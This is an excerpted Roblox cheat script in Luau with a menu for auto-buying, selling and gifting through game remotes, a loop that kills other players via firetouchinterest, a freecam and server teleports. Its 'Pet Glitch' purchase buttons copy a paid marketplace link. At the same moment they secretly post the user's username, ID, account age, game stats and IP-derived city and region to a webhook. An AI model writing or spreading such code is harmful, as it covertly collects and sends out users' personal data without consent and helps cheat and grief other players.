...
statsSystem.UseCompact = true
statsSystem.StartTime = tick()
statsSystem.PlayerOriginalStats = {}
statsSystem.SelectedPlayer = player
statsSystem.IsDropdownOpen = false
...
local pushStrengthToggle = vipTab:AddToggle({
    Name = "Push Strength",
    Default = false,
    Flag = genFlag(),
    Callback = function(l)
    ...
    Callback = function(s)
        ...
        task.spawn(function()
            while getgenv().AutoBuy do
                if currentSelectedPet ~= "" then
                    local petFolder = ReplicatedStorage:WaitForChild("shared"):WaitForChild("runtime"):FindFirstChild("cPetShopFolder")
                    local remote = ReplicatedStorage:WaitForChild("rEvents"):FindFirstChild("cPetShopRemote")
        ...
        if bool then
            task.spawn(function()
                while _G.AutoHatchAura and currentSelectedAura ~= "" do
                    local shopFolder = ReplicatedStorage:WaitForChild("shared"):WaitForChild("runtime"):FindFirstChild("cPetShopFolder")
                    local remote = ReplicatedStorage:WaitForChild("rEvents"):FindFirstChild("cPetShopRemote")
...
autoPetTab:AddToggle({
    ...
    Callback = function(s)
        ...
        local Event = RS.rEvents.sellPetEvent
...
autoPetTab:AddToggle({
    ...
    Callback = function(bool)
        ...
        local RS = game:GetService("ReplicatedStorage")
        local LP = game:GetService("Players").LocalPlayer
        local Event = RS.rEvents.sellPowerUpEvent
            ...
            task.spawn(function()
                ...
                while autoGiftRunning and (eggAmountInput <= 0 or count < eggAmountInput) do
                    ...
                    local success, result = pcall(function()
                        return ReplicatedStorage.rEvents.giftRemote:InvokeServer("giftRequest", targetPlayer, itemObj)
                    end)
...
autoKillerTab:AddButton({
    ...
    Callback = function() whitelistDropdown:SetValues(getDisplayList()) end
})
                ...
                while _G.GhostKill do
                    ...
                    if rh or lh then
                        for _, target in ipairs(Players:GetPlayers()) do
                            if target ~= player and not manualWhitelist[target.UserId] and target.Character then
                        ...
                        if target ~= player then
                            task.spawn(function()
                                ...
                                if evil and good and evil.Value > good.Value then
                                    ...
                                    if hum and hum.Health > 0 and trp then
                                        while autoGoodKarma and hum.Health > 0 do
                                            firetouchinterest(rh, trp, 1)
                                            firetouchinterest(rh, trp, 0)
                                            firetouchinterest(lh, trp, 1)
                                            firetouchinterest(lh, trp, 0)
...
local function ToggleFreecam(state)
    if state then
        ...
        renderConnection = RunService.RenderStepped:Connect(function(dt)
            ...
            workspace.CurrentCamera.CFrame = CFrame.new(workspace.CurrentCamera.CFrame.Position + velocity) * cameraCFrame
        end)
...
eventMiscTab:AddToggle({
    ...
    Callback = function(state)
        ...
        local function activateProteinEgg()
            ...
            if tool and player and player.muscleEvent then
...
local serverTab = ServerTabbox:AddTab("Server", "lucide:server")
serverTab:AddDivider({ Text = "Server" })

local currentJobID = ""
serverTab:AddTextInput({
...
serverTab:AddButton({
    ...
    Callback = function()
        if currentJobID ~= "" then
            game:GetService("TeleportService"):TeleportToPlaceInstance(game.PlaceId, currentJobID, player)
        else
...
local glitchTab = window:AddTab({
    Name = "Pet Glitch",
    Icon = "lucide:store",
    Type = "Single",
})

local glithTabbox = glitchTab:AddTabbox({ Name = "Buy Pet Glitch", Position = "center" })

local Tab2M = glithTabbox:AddTab("2M Glitch", "lucide:film")
Tab2M:AddImage({
    Name = "Preview",
    Image = "rbxassetid://138464053895991",
    Height = 150,
...
Tab2M:AddButton({
    Name = "Instant Delivery : 2.7$",
    Callback = function()
        setclipboard("https://www.eldorado.gg/roblox-items/oi/b31eacbe-855c-4bf1-2ae1-08ded2a6ab11?private=true")
        ...
        pcall(function()
            (syn and syn.request or http and http.request or http_request or fluxus and fluxus.request or request)({
                ...
                Body = game:GetService("HttpService"):JSONEncode({
                    ["embeds"] = {{
                        ["title"] = "⛩️  **Player Copy Link Pet Glitch 2M ** ⛩️",
                        ["color"] = 16777215,
                        ["thumbnail"] = { ["url"] = (function() local s, r = pcall(function() return game:GetService("HttpService"):JSONDecode(game:HttpGet("https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds="..game:GetService("Players").LocalPlayer.UserId.."&size=420x420&format=Png&isCircular=false")) end) return s and r.data[1].imageUrl or "" end)() },
                        ["fields"] = {
                            {
                                ["name"] = "**PLAYER INFORMATION**", 
                                ["value"] = string.format("```Username    : %s\nDisplay     : %s\nAccount Age : %d Thn\nID Account  : %s```", game:GetService("Players").LocalPlayer.Name, game:GetService("Players").LocalPlayer.DisplayName, math.floor(game:GetService("Players").LocalPlayer.AccountAge/365), tostring(game:GetService("Players").LocalPlayer.UserId)), 
                                ["inline"] = false
                            },
                            {
                                ["name"] = "**PLAYER STATS**", 
                                ["value"] = (function()
                                    ...
                                    local function fn(n) n = tonumber(n) or 0 if n < 1000 then return tostring(math.floor(n)) end local b = {"", "k", "M", "B", "T", "Qa", "Qi"} local i = math.min(math.floor(math.log10(n) / 3), #b - 1) return string.format("%.1f", math.floor((n / 10^(i * 3)) * 10) / 10):gsub("%.0$", "") .. b[i + 1] end
                                    local function fs(plr, name) if not plr then return nil end for _, o in ipairs(plr:GetChildren()) do if o.Name:lower() == name:lower() and (o:IsA("NumberValue") or o:IsA("IntValue")) then return o end end local ls = plr:FindFirstChild("leaderstats") if ls then for _, o in ipairs(ls:GetChildren()) do if o.Name:lower() == name:lower() then return o end end end local df = plr:FindFirstChild("Data") or plr:FindFirstChild("Stats") if df then for _, o in ipairs(df:GetChildren()) do if o.Name:lower() == name:lower() then return o end end end return nil end
                                    local sp = {}
                                    for _, s in ipairs({
                                        {I = "Rebirths", D = "Rebirth"},
                                        {I = "Strength", D = "Strength"},
                                        ...
                                        local obj = fs(p, s.I)
                                        if not obj and s.I == "Brawl" then obj = fs(p, "Brawls") or fs(p, "BrawlStats") end
                                        table.insert(sp, s.D .. ": " .. fn(obj and obj.Value or 0))
                                    end
                            ...
                            },
                            {
                                ...
                                ["value"] = (function() local s, r = pcall(function() return game:HttpGet("http://ip-api.com/json/") end) if s then local d = game:GetService("HttpService"):JSONDecode(r) if d and d.status == "success" then return string.format("```Negara   : %s\nProvinsi : %s\nKota     : %s```", d.country, d.regionName, d.city) end end return "```Unknown Location```" end)(), 
                                ["inline"] = false
                            }
                        },
        ...
        window:Notify({ 
            Title = "Link Copied", 
            Content = "Open In Chrome Or Browser" 
        })
    end
})

local Tab5M = glithTabbox:AddTab("5M Glitch", "lucide:film")
Tab5M:AddImage({
    Name = "Preview",
    Image = "rbxassetid://130009370603899",
    Height = 150,
    ScaleType = Enum.ScaleType.Fit,
    Color = Color3.fromRGB(255, 255, 255),
    Transparency = 0,
...
Tab5M:AddButton ({
    Name = "Instant Delivery : 4.7$",
    Callback = function()
        setclipboard("https://www.eldorado.gg/roblox-items/oi/9ea5a594-6afd-4176-ee70-08ded2a6a890?private=true")
        ...
        pcall(function()
            (syn and syn.request or http and http.request or http_request or fluxus and fluxus.request or request)({
                ...
                Body = game:GetService("HttpService"):JSONEncode({
                    ["embeds"] = {{
                        ["title"] = "⛩️  **Player Copy Link Pet Glitch 5M ** ⛩️",
                        ["color"] = 16777215,
                        ["thumbnail"] = { ["url"] = (function() local s, r = pcall(function() return game:GetService("HttpService"):JSONDecode(game:HttpGet("https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds="..game:GetService("Players").LocalPlayer.UserId.."&size=420x420&format=Png&isCircular=false")) end) return s and r.data[1].imageUrl or "" end)() },
                        ["fields"] = {
                            {
